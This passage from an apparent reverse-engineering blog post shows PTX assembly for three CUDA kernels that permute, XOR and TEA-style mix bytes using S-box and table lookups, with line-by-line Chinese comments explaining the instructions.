[_Z6Layer2PhS__param_1];<br>cvta.to.global.u64 %rd3, %rd2;<br>cvta.to.global.u64 %rd4, %rd1;<br>mov.u32 %r1, %ctaid.x;<br>mov.u32 %r2, %ntid.x;<br>mov.u32 %r3, %tid.x;<br>mad.lo.s32 %r4, %r1, %r2, %r3;<br>cvt.u<span class="hljs-number">64.</span>u32 %rd5, %r4;<br>add.s64 %rd6, %rd4, %rd5;<br>ld.global.u8 %rs1, [%rd6];<br>cvt.u<span class="hljs-number">64.</span>u32 %rd7, %r3;<br>mov.u64 %rd8, cuda_sbox;<br>add.s64 %rd9, %rd8, %rd7;<br>ld.<span class="hljs-type">const</span>.u8 %r5, [%rd9];<br>cvt.u<span class="hljs-number">64.</span>u32 %rd10, %r1;<br>add.s64 %rd11, %rd8, %rd10;<br>ld.<span class="hljs-type">const</span>.u8 %r6, [%rd11];<br>mad.lo.s32 %r7, %r2, %r5, %r6;<br>cvt.u<span class="hljs-number">64.</span>u32 %rd12, %r7;<br>add.s64 %rd13, %rd3, %rd12;<br>st.global.u8 [%rd13], %rs1;<br>ret;<br><br>&#125;<br><span class="hljs-comment">//</span><br>.visible .entry _Z6Layer3PhS_(<br>.param .u64 _Z6Layer3PhS__param_0,<br>.param .u64 _Z6Layer3PhS__param_1<br>)<br>&#123;<br>.reg .pred %p&lt;<span class="hljs-number">5</span>&gt;;<br>.reg .b16 %rs&lt;<span class="hljs-number">33</span>&gt;;<br>.reg .b32 %r&lt;<span class="hljs-number">52</span>&gt;;<br>.reg .b64 %rd&lt;<span class="hljs-number">24</span>&gt;;<br><br><br>ld.param.u64 %rd6, [_Z6Layer3PhS__param_0];<br>ld.param.u64 %rd5, [_Z6Layer3PhS__param_1];<br>mov.u32 %r21, %ntid.x;<br>mov.u32 %r1, %ctaid.x;<br>mul.lo.s32 %r49, %r1, %r21;<br>mov.u32 %r3, %tid.x;<br>add.s32 %r22, %r49, %r3;<br>cvt.u<span class="hljs-number">64.</span>u32 %rd1, %r22;<br>cvta.to.global.u64 %rd2, %rd6;<br>add.s64 %rd3, %rd2, %rd1;<br>cvt.u<span class="hljs-number">16.</span>u32 %rs8, %r3;<br>cvt.u<span class="hljs-number">16.</span>u32 %rs9, %r1;<br><span class="hljs-keyword">or</span>.b16 %rs10, %rs9, %rs8;<br>ld.global.u8 %rs11, [%rd3];<br><span class="hljs-keyword">xor</span>.b16 %rs12, %rs11, %rs10;<br>st.global.u8 [%rd3], %rs12;<br>bar.sync <span class="hljs-number">0</span>;<br><span class="hljs-keyword">and</span>.b32 %r23, %r3, <span class="hljs-number">7</span>;<br>setp.ne.s32 %p1, %r23, <span class="hljs-number">0</span>;<br>@%p1 bra $L__BB2_4;<br><br>ld.global.u32 %r47, [%rd3<span class="hljs-number">+4</span>];<br>ld.global.u32 %r48, [%rd3];<br>mov.u32 %r46, <span class="hljs-number">1786956040</span>;<br>mov.u32 %r45, <span class="hljs-number">0</span>;<br><br>$L__BB2_2:<br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>;<br>shl.b32 %r26, %r48, <span class="hljs-number">4</span>;<br>add.s32 %r27, %r26, <span class="hljs-number">1386807340</span>;<br>shr.u32 %r28, %r48, <span class="hljs-number">5</span>;<br>add.s32 %r29, %r28, <span class="hljs-number">2007053320</span>;<br><span class="hljs-keyword">xor</span>.b32 %r30, %r29, %r27;<br>add.s32 %r31, %r48, %r46;<br><span class="hljs-keyword">xor</span>.b32 %r32, %r30, %r31;<br>add.s32 %r47, %r32, %r47;<br>shl.b32 %r33, %r47, <span class="hljs-number">4</span>;<br>add.s32 %r34, %r33, <span class="hljs-number">621668851</span>;<br>add.s32 %r35, %r46, %r47;<br><span class="hljs-keyword">xor</span>.b32 %r36, %r34, %r35;<br>shr.u32 %r37, %r47, <span class="hljs-number">5</span>;<br>add.s32 %r38, %r37, <span class="hljs-number">-862448841</span>;<br><span class="hljs-keyword">xor</span>.b32 %r39, %r36, %r38;<br>sub.s32 %r48, %r48, %r39;<br>add.s32 %r46, %r46, <span class="hljs-number">-1708609273</span>;<br>add.s32 %r45, %r45, <span class="hljs-number">1</span>;<br>setp.ne.s32 %p2, %r45, <span class="hljs-number">3238567</span>;<br>@%p2 bra $L__BB2_2;<br><br>st.global.u32 [%rd3], %r48;<br>st.global.u32 [%rd3<span class="hljs-number">+4</span>], %r47;<br><br>$L__BB2_4:<br>bar.sync <span class="hljs-number">0</span>;<br><span class="hljs-keyword">and</span>.b16 %rs16, %rs9, %rs8;<br>ld.global.u8 %rs17, [%rd3];<br><span class="hljs-keyword">xor</span>.b16 %rs18, %rs17, %rs16;<br>st.global.u8 [%rd3], %rs18;<br>bar.sync <span class="hljs-number">0</span>;<br>cvt.u<span class="hljs-number">64.</span>u32 %rd7, %r3;<br>mov.u64 %rd8, cuda_sbox;<br>add.s64 %rd9, %rd8, %rd7;<br>ld.<span class="hljs-type">const</span>.u8 %rs31, [%rd9];<br>cvta.to.global.u64 %rd4, %rd5;<br>mov.u16 %rs32, <span class="hljs-number">0</span>;<br>mov.u32 %r50, <span class="hljs-number">0</span>;<br>mov.u64 %rd14, cuda_tbox;<br><br>$L__BB2_5:<br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>;<br>cvt.u<span class="hljs-number">64.</span>u32 %rd10, %r49;<br>add.s64 %rd11, %rd2, %rd10;<br>cvt.u<span class="hljs-number">64.</span>u16 %rd12, %rs31;<br><span class="hljs-keyword">and</span>.b64 %rd13, %rd12, <span class="hljs-number">255</span>;<br>add.s64 %rd15, %rd14, %rd13;<br>ld.<span class="hljs-type">const</span>.u8 %rs19, [%rd15];<br>ld.global.u8 %rs20, [%rd11];<br>mul.lo.s16 %rs21, %rs19, %rs20;<br>add.s16 %rs32, %rs21, %rs32;<br>mul.lo.s16 %rs22, %rs31, <span class="hljs-number">5</span>;<br>add.s16 %rs31, %rs22, <span class="hljs-number">17</span>;<br>add.s32 %r49, %r49, <span class="hljs-number">1</span>;<br>add.s32 %r50, %r50, <span class="hljs-number">1</span>;<br>setp.ne.s32 %p3, %r50, <span class="hljs-number">256</span>;<br>@%p3 bra $L__BB2_5;<br><br><span class="hljs-keyword">xor</span>.b32 %r18, %r1, %r3;<br>mov.u32 %r51, <span class="hljs-number">8</span>;<br><br>$L__BB2_7:<br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>;<br>shl.b16 %rs23, %rs32, <span class="hljs-number">3</span>;<br><span class="hljs-keyword">and</span>.b16 %rs24, %rs32, <span class="hljs-number">224</span>;<br>shr.u16 %rs25, %rs24, <span class="hljs-number">5</span>;<br><span class="hljs-keyword">or</span>.b16 %rs26, %rs25, %rs23;<br>cvt.u<span class="hljs-number">32.</span>u16 %r42, %rs26;<br>mad.lo.s32 %r43, %r42, <span class="hljs-number">13</span>, %r18;<br><span class="hljs-keyword">and</span>.b32 %r44, %r51, <span class="hljs-number">255</span>;<br>cvt.u<span class="hljs-number">64.</span>u32 %rd16, %r44;<br>add.s64 %rd18, %rd14, %rd16;<br>cvt.u<span class="hljs-number">16.</span>u32 %rs27, %r43;<br>ld.<span class="hljs-type">const</span>.u8 %rs28, [%rd18];<br><span class="hljs-keyword">xor</span>.b16 %rs29, %rs28, %rs27;<br>cvt.u<span class="hljs-number">64.</span>u16 %rd19, %rs29;<br><span class="hljs-keyword">and</span>.b64 %rd20, %rd19, <span class="hljs-number">255</span>;<br>add.s64 %rd22, %rd8, %rd20;<br>ld.<span class="hljs-type">const</span>.u8 %rs32, [%rd22];<br>add.s32 %r51, %r51, <span class="hljs-number">1</span>;<br>setp.ne.s32 %p4, %r51, <span class="hljs-number">4137823</span>;<br>@%p4 bra $L__BB2_7;<br><br>add.s64 %rd23, %rd4, %rd1;<br>st.global.u8 [%rd23], %rs32;<br>ret;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Layer1</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.visible .entry _Z6Layer1PhS_(<br>.param .u64 _Z6Layer1PhS__param_0,<br>.param .u64 _Z6Layer1PhS__param_1<br>)<br>&#123;<br>.reg .pred %p&lt;<span class="hljs-number">6</span>&gt;;<br>.reg .b16 %rs&lt;<span class="hljs-number">2</span>&gt;;<br>.reg .f32 %f&lt;<span class="hljs-number">12</span>&gt;;<br>.reg .b32 %r&lt;<span class="hljs-number">23</span>&gt;;<br>.reg .b64 %rd&lt;<span class="hljs-number">15</span>&gt;;<br><br><span class="hljs-comment">// 加载内核参数（指向全局内存的指针）</span><br>ld.param.u64 %rd5, [_Z6Layer1PhS__param_0]; <span class="hljs-comment">// %rd5 = input_ptr (第一个参数)</span><br>ld.param.u64 %rd6, [_Z6Layer1PhS__param_1]; <span class="hljs-comment">// %rd6 = output_ptr (第二个参数)</span><br><br><span class="hljs-comment">// 获取线程和块 ID</span><br>mov.u32 %r1, %tid.x;   <span class="hljs-comment">// %r1 = 当前线程在其块内的 x 轴 ID</span><br>mov.u32 %r2, %ctaid.x; <span class="hljs-comment">// %r2 = 当前块在网格内的 x 轴 ID</span><br><br><span class="hljs-comment">// 基于线程和块 ID 的条件执行</span><br>setp.lt.u32 %p1, %r1, <span class="hljs-number">241</span>; <span class="hljs-comment">// %p1 = 如果 %tid.x &lt; 241，则为真</span><br>setp.lt.u32 %p2, %r2, <span class="hljs-number">241</span>; <span class="hljs-comment">// %p2 = 如果 %ctaid.x &lt; 241，则为真</span><br><span class="hljs-keyword">and</span>.pred %p3, %p1, %p2;    <span class="hljs-comment">// %p3 = 如果 (%tid.x &lt; 241) 且 (%ctaid.x &lt; 241)，则为真</span><br><br>@%p3 bra $L__BB0_2; <span class="hljs-comment">// 如果 %p3 为真，则跳转到 $L__BB0_2 (主计算部分)</span><br>bra.uni $L__BB0_1;   <span class="hljs-comment">// 否则，无条件跳转到 $L__BB0_1 (跳过计算)</span><br><br>$L__BB0_2: <span class="hljs-comment">// 主计算路径（如果线程/块 ID 在范围内）</span><br>mov.u32 %r3, %ntid.x;     <span class="hljs-comment">// %r3 = 线程块在 x 轴的线程数</span><br>cvta.to.global.u64 %rd1, %rd5; <span class="hljs-comment">// 将 input_ptr 转换为全局内存地址。%rd1 现在指向输入数据。</span><br>mov.f32 %f10, <span class="hljs-number">0</span>f00000000; <span class="hljs-comment">// %f10 = 0.0 (浮点求和的累加器)</span><br>mov.u32 %r11, <span class="hljs-number">0</span>;          <span class="hljs-comment">// %r11 = 循环计数器初始化</span><br>mov.u64 %rd8, cuda_motion; <span class="hljs-comment">// %rd8 = cuda_motion 常量数组的基地址</span><br>mov.u32 %r20, %r11;       <span class="hljs-comment">// %r20 = 外层循环计数器（初始化为 0）</span><br><br>$L__BB0_3: <span class="hljs-comment">// 外层循环（迭代 16 次）</span><br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>; <span class="hljs-comment">// 编译器提示：不要展开此循环。</span><br>add.s32 %r13, %r20, %r2;    <span class="hljs-comment">// %r13 = outer_loop_counter + block_id.x</span><br>shl.b32 %r14, %r20, <span class="hljs-number">4</span>;      <span class="hljs-comment">// %r14 = outer_loop_counter * 16 (每个浮点数 4 字节，每个内层循环 16 个元素)</span><br>mov.u32 %r15, <span class="hljs-number">240</span>;          <span class="hljs-comment">// %r15 = 240 (常量)</span><br>sub.s32 %r16, %r15, %r14;   <span class="hljs-comment">// %r16 = 240 - (outer_loop_counter * 16)</span><br>mad.lo.s32 %r21, %r13, %r3, %r1; <span class="hljs-comment">// %r21 = (outer_loop_counter + block_id.x) * num_threads_per_block + thread_id.x</span><br>                               <span class="hljs-comment">// 这计算了访问输入数据的全局索引。</span><br>mul.wide.u32 %rd7, %r16, <span class="hljs-number">4</span>; <span class="hljs-comment">// %rd7 = (240 - (outer_loop_counter * 16)) * 4。这计算了 cuda_motion 中的偏移量。</span><br>add.s64 %rd14, %rd8, %rd7;  <span class="hljs-comment">// %rd14 = cuda_motion 的地址 + 计算出的偏移量。这是此内层循环中 cuda_motion 中权重的起始地址。</span><br>mov.u32 %r22, %r11;         <span class="hljs-comment">// %r22 = 内层循环计数器（初始化为 0）</span><br><br>$L__BB0_4: <span class="hljs-comment">// 内层循环（迭代 16 次）</span><br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>; <span class="hljs-comment">// 编译器提示：不要展开此循环。</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd9, %r21;    <span class="hljs-comment">// 将输入索引转换为 64 位以进行地址计算</span><br>add.s64 %rd10, %rd1, %rd9; <span class="hljs-comment">// %rd10 = input_ptr + input_index。输入字节的地址。</span><br>ld.global.u8 %rs1, [%rd10]; <span class="hljs-comment">// 从全局输入内存加载 1 字节到 %rs1 (16 位寄存器)</span><br>cvt.rn.f<span class="hljs-number">32.</span>u16 %f7, %rs1;  <span class="hljs-comment">// 将加载的字节（作为无符号 16 位）转换为 float32 (%f7) (四舍五入到最近的整数)</span><br>ld.<span class="hljs-type">const</span>.f32 %f8, [%rd14]; <span class="hljs-comment">// 从 cuda_motion 加载 4 字节（一个 float32）到 %f8 (这是一个权重)</span><br>fma.rn.f32 %f10, %f8, %f7, %f10; <span class="hljs-comment">// 融合乘加： %f10 = (%f8 * %f7) + %f10。累加加权和。</span><br>add.s32 %r21, %r21, <span class="hljs-number">1</span>;     <span class="hljs-comment">// 递增输入索引，用于下一次迭代</span><br>add.s64 %rd14, %rd14, <span class="hljs-number">4</span>;   <span class="hljs-comment">// 递增 cuda_motion 地址 4 字节（浮点数大小）</span><br>add.s32 %r22, %r22, <span class="hljs-number">1</span>;     <span class="hljs-comment">// 递增内层循环计数器</span><br>setp.ne.s32 %p4, %r22, <span class="hljs-number">16</span>; <span class="hljs-comment">// %p4 = 如果 inner_loop_counter != 16，则为真</span><br>@%p4 bra $L__BB0_4;        <span class="hljs-comment">// 如果 %p4 为真，继续内层循环</span><br><br>add.s32 %r20, %r20, <span class="hljs-number">1</span>;     <span class="hljs-comment">// 递增外层循环计数器</span><br>setp.lt.u32 %p5, %r20, <span class="hljs-number">16</span>; <span class="hljs-comment">// %p5 = 如果 outer_loop_counter &lt; 16，则为真</span><br>@%p5 bra $L__BB0_3;        <span class="hljs-comment">// 如果 %p5 为真，继续外层循环</span><br>bra.uni $L__BB0_6;         <span class="hljs-comment">// 循环完成后，无条件跳转到 $L__BB0_6</span><br><br>$L__BB0_1: <span class="hljs-comment">// 对于超出范围的线程/块的路径</span><br>mov.f32 %f10, <span class="hljs-number">0</span>f00000000; <span class="hljs-comment">// 将累加器初始化为 0.0 (它们实际上不进行计算)</span><br><br>$L__BB0_6: <span class="hljs-comment">// 计算或跳过后的通用代码路径</span><br>cvt.rzi.u<span class="hljs-number">32.f32</span> %r17, %f10; <span class="hljs-comment">// 将累加的 float32 值 (%f10) 转换为无符号 32 位整数，向零舍入。</span><br>mov.u32 %r18, %ntid.x;      <span class="hljs-comment">// %r18 = 线程块在 x 轴的线程数</span><br>mad.lo.s32 %r19, %r2, %r18, %r1; <span class="hljs-comment">// %r19 = block_id.x * num_threads_per_block + thread_id.x (全局线程索引)</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd11, %r19;    <span class="hljs-comment">// 将全局线程索引转换为 64 位</span><br>cvta.to.global.u64 %rd12, %rd6; <span class="hljs-comment">// 将 output_ptr 转换为全局内存地址。%rd12 指向输出数据。</span><br>add.s64 %rd13, %rd12, %rd11; <span class="hljs-comment">// %rd13 = output_ptr + global_thread_index。写入输出的地址。</span><br>st.global.u8 [%rd13], %r17; <span class="hljs-comment">// 将 %r17 的低 8 位（结果）存储到全局输出内存。</span><br>ret; <span class="hljs-comment">// 从内核返回。</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Layer2</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.visible .entry _Z6Layer2PhS_(<br>.param .u64 _Z6Layer2PhS__param_0,<br>.param .u64 _Z6Layer2PhS__param_1<br>)<br>&#123;<br>.reg .b16 %rs&lt;<span class="hljs-number">2</span>&gt;;<br>.reg .b32 %r&lt;<span class="hljs-number">8</span>&gt;;<br>.reg .b64 %rd&lt;<span class="hljs-number">14</span>&gt;;<br><br><span class="hljs-comment">// 加载内核参数（指向全局内存的指针）</span><br>ld.param.u64 %rd1, [_Z6Layer2PhS__param_0]; <span class="hljs-comment">// %rd1 = input_ptr</span><br>ld.param.u64 %rd2, [_Z6Layer2PhS__param_1]; <span class="hljs-comment">// %rd2 = output_ptr</span><br><br><span class="hljs-comment">// 将指针转换为全局内存地址</span><br>cvta.to.global.u64 %rd3, %rd2; <span class="hljs-comment">// %rd3 = global_output_ptr</span><br>cvta.to.global.u64 %rd4, %rd1; <span class="hljs-comment">// %rd4 = global_input_ptr</span><br><br><span class="hljs-comment">// 获取线程和块 ID 并计算全局线程索引</span><br>mov.u32 %r1, %ctaid.x;   <span class="hljs-comment">// %r1 = block_id.x</span><br>mov.u32 %r2, %ntid.x;   <span class="hljs-comment">// %r2 = num_threads_per_block.x</span><br>mov.u32 %r3, %tid.x;    <span class="hljs-comment">// %r3 = thread_id.x</span><br>mad.lo.s32 %r4, %r1, %r2, %r3; <span class="hljs-comment">// %r4 = block_id.x * num_threads_per_block.x + thread_id.x (全局线程索引)</span><br><br><span class="hljs-comment">// 读取输入字节</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd5, %r4;    <span class="hljs-comment">// 将全局线程索引转换为 64 位</span><br>add.s64 %rd6, %rd4, %rd5; <span class="hljs-comment">// %rd6 = global_input_ptr + global_thread_index。要读取的地址。</span><br>ld.global.u8 %rs1, [%rd6]; <span class="hljs-comment">// 从全局输入内存加载 1 字节到 %rs1</span><br><br><span class="hljs-comment">// 执行 S 盒查找</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd7, %r3;    <span class="hljs-comment">// 将 thread_id.x 转换为 64 位以作为索引</span><br>mov.u64 %rd8, cuda_sbox;  <span class="hljs-comment">// %rd8 = cuda_sbox 的基地址</span><br>add.s64 %rd9, %rd8, %rd7; <span class="hljs-comment">// %rd9 = cuda_sbox_base + thread_id.x。用于 S 盒查找的地址。</span><br>ld.<span class="hljs-type">const</span>.u8 %r5, [%rd9];  <span class="hljs-comment">// 从 cuda_sbox 中以 thread_id.x 为索引加载 1 字节到 %r5</span><br><br>cvt.u<span class="hljs-number">64.</span>u32 %rd10, %r1;   <span class="hljs-comment">// 将 block_id.x 转换为 64 位以作为索引</span><br>add.s64 %rd11, %rd8, %rd10; <span class="hljs-comment">// %rd11 = cuda_sbox_base + block_id.x。用于另一次 S 盒查找的地址。</span><br>ld.<span class="hljs-type">const</span>.u8 %r6, [%rd11]; <span class="hljs-comment">// 从 cuda_sbox 中以 block_id.x 为索引加载 1 字节到 %r6</span><br><br><span class="hljs-comment">// 计算输出地址偏移</span><br>mad.lo.s32 %r7, %r2, %r5, %r6; <span class="hljs-comment">// %r7 = num_threads_per_block.x * S_box_val(thread_id.x) + S_box_val(block_id.x)</span><br>                               <span class="hljs-comment">// 这计算了写入输出的最终偏移量。</span><br><br><span class="hljs-comment">// 写入输出</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd12, %r7;   <span class="hljs-comment">// 将计算出的偏移量转换为 64 位</span><br>add.s64 %rd13, %rd3, %rd12; <span class="hljs-comment">// %rd13 = global_output_ptr + calculated_offset。最终输出地址。</span><br>st.global.u8 [%rd13], %rs1; <span class="hljs-comment">// 将输入字节 (%rs1) 存储到计算出的输出地址。</span><br>ret; <span class="hljs-comment">// 从内核返回。</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Layer3</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs cpp">.visible .entry _Z6Layer3PhS_(<br>.param .u64 _Z6Layer3PhS__param_0,<br>.param .u64 _Z6Layer3PhS__param_1<br>)<br>&#123;<br>.reg .pred %p&lt;<span class="hljs-number">5</span>&gt;;<br>.reg .b16 %rs&lt;<span class="hljs-number">33</span>&gt;;<br>.reg .b32 %r&lt;<span class="hljs-number">52</span>&gt;;<br>.reg .b64 %rd&lt;<span class="hljs-number">24</span>&gt;;<br><br><span class="hljs-comment">// 加载内核参数（指向全局内存的指针）</span><br>ld.param.u64 %rd6, [_Z6Layer3PhS__param_0]; <span class="hljs-comment">// %rd6 = input/output_ptr (数据从这里读取并写入这里)</span><br>ld.param.u64 %rd5, [_Z6Layer3PhS__param_1]; <span class="hljs-comment">// %rd5 = another output_ptr (用于最终写入)</span><br><br><span class="hljs-comment">// 获取线程和块 ID 并计算全局线程索引</span><br>mov.u32 %r21, %ntid.x;  <span class="hljs-comment">// %r21 = num_threads_per_block.x</span><br>mov.u32 %r1, %ctaid.x;  <span class="hljs-comment">// %r1 = block_id.x</span><br>mul.lo.s32 %r49, %r1, %r21; <span class="hljs-comment">// %r49 = block_id.x * num_threads_per_block.x (块的基偏移量)</span><br>mov.u32 %r3, %tid.x;    <span class="hljs-comment">// %r3 = thread_id.x</span><br>add.s32 %r22, %r49, %r3; <span class="hljs-comment">// %r22 = 全局线程索引</span><br><br><span class="hljs-comment">// 计算初始读/写地址</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd1, %r22;    <span class="hljs-comment">// 将全局线程索引转换为 64 位</span><br>cvta.to.global.u64 %rd2, %rd6; <span class="hljs-comment">// 将 input/output_ptr 转换为全局内存地址</span><br>add.s64 %rd3, %rd2, %rd1;  <span class="hljs-comment">// %rd3 = global_input_output_ptr + global_thread_index。要操作的地址。</span><br><br><span class="hljs-comment">// 第一次 XOR 操作</span><br>cvt.u<span class="hljs-number">16.</span>u32 %rs8, %r3;  <span class="hljs-comment">// 将 thread_id.x 转换为 16 位</span><br>cvt.u<span class="hljs-number">16.</span>u32 %rs9, %r1;  <span class="hljs-comment">// 将 block_id.x 转换为 16 位</span><br><span class="hljs-keyword">or</span>.b16 %rs10, %rs9, %rs8; <span class="hljs-comment">// %rs10 = (block_id.x OR thread_id.x) (16 位)</span><br>ld.global.u8 %rs11, [%rd3]; <span class="hljs-comment">// 从 %rd3 的全局内存加载 1 字节到 %rs11</span><br><span class="hljs-keyword">xor</span>.b16 %rs12, %rs11, %rs10; <span class="hljs-comment">// %rs12 = loaded_byte XOR (%rs10)</span><br>st.global.u8 [%rd3], %rs12; <span class="hljs-comment">// 将结果存储回相同的全局内存位置 (%rd3)</span><br><br>bar.sync <span class="hljs-number">0</span>; <span class="hljs-comment">// 同步块内的所有线程。这在读取可能已被块内其他线程写入的数据之前至关重要。</span><br><br><span class="hljs-comment">// 条件哈希类计算</span><br><span class="hljs-keyword">and</span>.b32 %r23, %r3, <span class="hljs-number">7</span>;   <span class="hljs-comment">// %r23 = thread_id.x AND 7 (检查 if thread_id.x % 8 == 0)</span><br>setp.ne.s32 %p1, %r23, <span class="hljs-number">0</span>; <span class="hljs-comment">// %p1 = 如果 (thread_id.x % 8 != 0)，则为真</span><br>@%p1 bra $L__BB2_4;     <span class="hljs-comment">// 如果 %p1 为真，则跳转到 $L__BB2_4 (跳过哈希计算)</span><br><br><span class="hljs-comment">// 只有 thread_id.x % 8 == 0 的线程才执行此块</span><br>ld.global.u32 %r47, [%rd3<span class="hljs-number">+4</span>]; <span class="hljs-comment">// 从全局内存 %rd3 + 4 加载 4 字节到 %r47 (第二个 32 位字)</span><br>ld.global.u32 %r48, [%rd3];   <span class="hljs-comment">// 从全局内存 %rd3 加载 4 字节到 %r48 (第一个 32 位字)</span><br>mov.u32 %r46, <span class="hljs-number">1786956040</span>;     <span class="hljs-comment">// %r46 = 初始常量 (哈希状态的一部分)</span><br>mov.u32 %r45, <span class="hljs-number">0</span>;              <span 